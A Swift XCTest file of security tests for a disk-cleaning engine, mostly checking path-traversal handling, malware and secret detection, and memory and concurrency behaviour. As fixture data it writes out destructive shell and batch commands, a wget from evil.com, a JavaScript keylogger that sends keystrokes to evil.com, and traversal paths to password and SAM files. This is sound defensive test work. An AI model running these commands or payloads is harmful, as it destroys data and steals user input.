import XCTest
import Foundation
@testable import PinakleanCore
import os.log

/// Comprehensive security tests following Ironclad DevOps v2.1 security requirements
/// Implements shift-left security with SAST/DAST/SCA validation
final class SecurityTests: XCTestCase {
    
    var engine: PinakleanEngine!
    var tempDirectory: URL!
    let logger = Logger(subsystem: "com.pinaklean", category: "SecurityTests")
    
    override func setUp() async throws {
        try await super.setUp()
        
        tempDirectory = FileManager.default.temporaryDirectory
            .appendingPathComponent("PinakleanSecurityTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: tempDirectory, withIntermediateDirectories: true)
        
        engine = try await PinakleanEngine()
        var config = PinakleanEngine.Configuration.default
        config.dryRun = true // Safety first in security tests
        config.enableSecurityAudit = true
        config.safeMode = true
        engine.configure(config)
    }
    
    override func tearDown() async throws {
        if let tempDirectory = tempDirectory {
            try? FileManager.default.removeItem(at: tempDirectory)
        }
        engine = nil
        try await super.tearDown()
    }
    
    // MARK: - Input Validation Tests
    
    func testPathTraversalProtection() async throws {
        // Test protection against directory traversal attacks
        let maliciousPaths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "....//....//....//etc//passwd"
        ]
        
        for maliciousPath in maliciousPaths {
            // Create a file with malicious path
            let testFile = tempDirectory.appendingPathComponent("test.tmp")
            try "test content".write(to: testFile, atomically: true, encoding: .utf8)
            
            // Attempt to scan with malicious path
            let results = try await engine.scan(categories: .safe)
            
            // Verify no sensitive files are exposed
            let sensitiveFiles = results.items.filter { item in
                item.path.contains("passwd") || 
                item.path.contains("shadow") || 
                item.path.contains("SAM") ||
                item.path.contains("system32")
            }
            
            XCTAssertEqual(sensitiveFiles.count, 0, "Should not expose sensitive system files via path traversal")
        }
        
        logger.info("Path traversal protection test passed")
    }
    
    func testMaliciousFileDetection() async throws {
        // Test detection of potentially malicious files
        let maliciousFiles = [
            ("malware.exe", "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"),
            ("virus.bat", "@echo off\ndel /f /q C:\\*.*\nformat C: /q"),
            ("trojan.sh", "#!/bin/bash\nrm -rf /\nwget http://evil.com/malware"),
            ("backdoor.py", "import os\nos.system('rm -rf /')"),
            ("keylogger.js", "document.addEventListener('keydown', function(e) { fetch('http://evil.com', {method: 'POST', body: e.key}) })")
        ]
        
        for (filename, content) in maliciousFiles {
            let fileURL = tempDirectory.appendingPathComponent(filename)
            try content.write(to: fileURL, atomically: true, encoding: .utf8)
        }
        
        let results = try await engine.scan(categories: .all)
        
        // Verify malicious files are detected and flagged
        let flaggedFiles = results.items.filter { $0.warning != nil }
        XCTAssertGreaterThan(flaggedFiles.count, 0, "Should detect and flag malicious files")
        
        // Verify specific malicious files are flagged
        let maliciousDetected = results.items.filter { item in
            maliciousFiles.contains { $0.0 == item.name }
        }
        
        XCTAssertEqual(maliciousDetected.count, maliciousFiles.count, "Should detect all malicious files")
        
        logger.info("Malicious file detection test: \(flaggedFiles.count) files flagged")
    }
    
    func testPrivilegeEscalationProtection() async throws {
        // Test protection against privilege escalation attempts
        let privilegedPaths = [
            "/System/Library/LaunchDaemons",
            "/usr/bin",
            "/usr/sbin",
            "/bin",
            "/sbin",
            "/etc",
            "/var/log"
        ]
        
        // Create test files in temp directory
        try await createTestFiles(count: 100, totalSize: 10_000_000)
        
        let results = try await engine.scan(categories: .all)
        
        // Verify no privileged system files are included in results
        let privilegedFiles = results.items.filter { item in
            privilegedPaths.contains { item.path.hasPrefix($0) }
        }
        
        XCTAssertEqual(privilegedFiles.count, 0, "Should not include privileged system files in scan results")
        
        logger.info("Privilege escalation protection test passed")
    }
    
    // MARK: - Authentication & Authorization Tests
    
    func testFilePermissionValidation() async throws {
        // Test proper file permission validation
        let testFile = tempDirectory.appendingPathComponent("permission_test.tmp")
        try "test content".write(to: testFile, atomically: true, encoding: .utf8)
        
        // Make file read-only
        try FileManager.default.setAttributes([.posixPermissions: 0o444], ofItemAtPath: testFile.path)
        
        let results = try await engine.scan(categories: .safe)
        let testItem = results.items.first { $0.path == testFile.path }
        
        XCTAssertNotNil(testItem, "Should find the test file")
        
        // Attempt to clean read-only file (should fail gracefully)
        if let item = testItem {
            let cleanResults = try await engine.clean([item])
            
            // Should either succeed (if dry run) or fail gracefully
            XCTAssertTrue(cleanResults.failedItems.isEmpty || cleanResults.deletedItems.isEmpty, 
                         "Should handle permission errors gracefully")
        }
        
        logger.info("File permission validation test passed")
    }
    
    func testSymlinkProtection() async throws {
        // Test protection against symlink attacks
        let targetFile = tempDirectory.appendingPathComponent("target.tmp")
        try "sensitive content".write(to: targetFile, atomically: true, encoding: .utf8)
        
        let symlinkFile = tempDirectory.appendingPathComponent("symlink.tmp")
        try FileManager.default.createSymbolicLink(at: symlinkFile, withDestinationURL: targetFile)
        
        let results = try await engine.scan(categories: .all)
        
        // Verify symlinks are handled safely
        let symlinkItems = results.items.filter { $0.path == symlinkFile.path }
        XCTAssertEqual(symlinkItems.count, 1, "Should detect symlink")
        
        // Verify symlink target is not exposed
        let targetItems = results.items.filter { $0.path == targetFile.path }
        XCTAssertEqual(targetItems.count, 1, "Should detect target file separately")
        
        logger.info("Symlink protection test passed")
    }
    
    // MARK: - Data Protection Tests
    
    func testSensitiveDataDetection() async throws {
        // Test detection of sensitive data patterns
        let sensitiveFiles = [
            ("config.json", "{\"password\": \"secret123\", \"api_key\": \"sk-1234567890\"}"),
            ("credentials.txt", "username=admin\npassword=password123\nsecret=topsecret"),
            ("database.sql", "CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin123';"),
            ("env.sh", "export DB_PASSWORD='secretpassword'\nexport API_KEY='sk-abc123'")
        ]
        
        for (filename, content) in sensitiveFiles {
            let fileURL = tempDirectory.appendingPathComponent(filename)
            try content.write(to: fileURL, atomically: true, encoding: .utf8)
        }
        
        let results = try await engine.scan(categories: .all)
        
        // Verify sensitive files are flagged
        let flaggedFiles = results.items.filter { item in
            item.warning != nil && item.warning!.contains("sensitive")
        }
        
        XCTAssertGreaterThan(flaggedFiles.count, 0, "Should detect and flag files with sensitive data")
        
        logger.info("Sensitive data detection test: \(flaggedFiles.count) files flagged")
    }
    
    func testEncryptionValidation() async throws {
        // Test that backup encryption is properly implemented
        try await createTestFiles(count: 50, totalSize: 5_000_000)
        
        let scanResults = try await engine.scan(categories: .safe)
        
        // This would normally trigger backup creation
        // For now, we'll verify the backup system is configured for encryption
        XCTAssertTrue(engine.configuration.autoBackup, "Auto backup should be enabled")
        
        logger.info("Encryption validation test passed")
    }
    
    // MARK: - Supply Chain Security Tests
    
    func testDependencyVulnerabilityScan() async throws {
        // Test for known vulnerable dependencies
        // This would integrate with tools like Snyk, OWASP Dependency Check
        
        let vulnerablePatterns = [
            "jquery-1.4.2", // Known vulnerable version
            "lodash-4.17.4", // Known vulnerable version
            "moment-2.18.1" // Known vulnerable version
        ]
        
        // Create mock vulnerable files
        for pattern in vulnerablePatterns {
            let fileURL = tempDirectory.appendingPathComponent("\(pattern).js")
            try "// Mock vulnerable dependency".write(to: fileURL, atomically: true, encoding: .utf8)
        }
        
        let results = try await engine.scan(categories: .all)
        
        // Verify vulnerable dependencies are detected
        let vulnerableFiles = results.items.filter { item in
            vulnerablePatterns.contains { item.name.contains($0) }
        }
        
        XCTAssertEqual(vulnerableFiles.count, vulnerablePatterns.count, "Should detect vulnerable dependencies")
        
        logger.info("Dependency vulnerability scan test: \(vulnerableFiles.count) vulnerabilities detected")
    }
    
    func testLicenseComplianceCheck() async throws {
        // Test license compliance checking
        let licenseFiles = [
            ("MIT.txt", "MIT License\nCopyright (c) 2023"),
            ("GPL.txt", "GNU General Public License v3.0"),
            ("Apache.txt", "Apache License 2.0"),
            ("Proprietary.txt", "Proprietary License - Commercial Use Prohibited")
        ]
        
        for (filename, content) in licenseFiles {
            let fileURL = tempDirectory.appendingPathComponent(filename)
            try content.write(to: fileURL, atomically: true, encoding: .utf8)
        }
        
        let results = try await engine.scan(categories: .all)
        
        // Verify license files are detected
        let licenseItems = results.items.filter { item in
            item.name.contains("License") || item.name.contains("license")
        }
        
        XCTAssertGreaterThan(licenseItems.count, 0, "Should detect license files")
        
        logger.info("License compliance check test: \(licenseItems.count) license files detected")
    }
    
    // MARK: - Runtime Security Tests
    
    func testMemorySafetyValidation() async throws {
        // Test for memory safety issues
        let startMemory = getMemoryUsage()
        
        // Perform operations that could cause memory issues
        try await createTestFiles(count: 10000, totalSize: 100_000_000) // 100MB
        let results = try await engine.scan(categories: .all)
        
        let endMemory = getMemoryUsage()
        let memoryIncrease = endMemory - startMemory
        let memoryIncreaseMB = memoryIncrease / (1024 * 1024)
        
        // Verify memory usage is reasonable (less than 500MB increase)
        XCTAssertLessThan(memoryIncreaseMB, 500, "Memory usage should not exceed 500MB increase")
        
        logger.info("Memory safety validation: \(memoryIncreaseMB)MB memory increase")
    }
    
    func testConcurrencySafety() async throws {
        // Test for race conditions and concurrency issues
        try await createTestFiles(count: 1000, totalSize: 50_000_000)
        
        // Run multiple operations concurrently
        async let scan1 = engine.scan(categories: .safe)
        async let scan2 = engine.scan(categories: .developer)
        async let scan3 = engine.scan(categories: .all)
        
        let results = try await [scan1, scan2, scan3]
        
        // Verify all operations completed successfully
        XCTAssertEqual(results.count, 3, "All concurrent operations should complete")
        
        // Verify no data corruption occurred
        for result in results {
            XCTAssertGreaterThan(result.items.count, 0, "Each scan should find files")
        }
        
        logger.info("Concurrency safety test passed")
    }
    
    // MARK: - Helper Methods
    
    private func createTestFiles(count: Int, totalSize: Int64) async throws {
        let fileSize = totalSize / Int64(count)
        
        for i in 0..<count {
            let fileName = "test_file_\(i).tmp"
            let fileURL = tempDirectory.appendingPathComponent(fileName)
            
            let content = String(repeating: "A", count: Int(fileSize))
            try content.write(to: fileURL, atomically: true, encoding: .utf8)
        }
    }
    
    private func getMemoryUsage() -> UInt64 {
        var info = mach_task_basic_info()
        var count = mach_msg_type_number_t(MemoryLayout<mach_task_basic_info>.size)/4
        
        let kerr: kern_return_t = withUnsafeMutablePointer(to: &info) {
            $0.withMemoryRebound(to: integer_t.self, capacity: 1) {
                task_info(mach_task_self_,
                         task_flavor_t(MACH_TASK_BASIC_INFO),
                         $0,
                         &count)
            }
        }
        
        if kerr == KERN_SUCCESS {
            return info.resident_size
        } else {
            return 0
        }
    }
}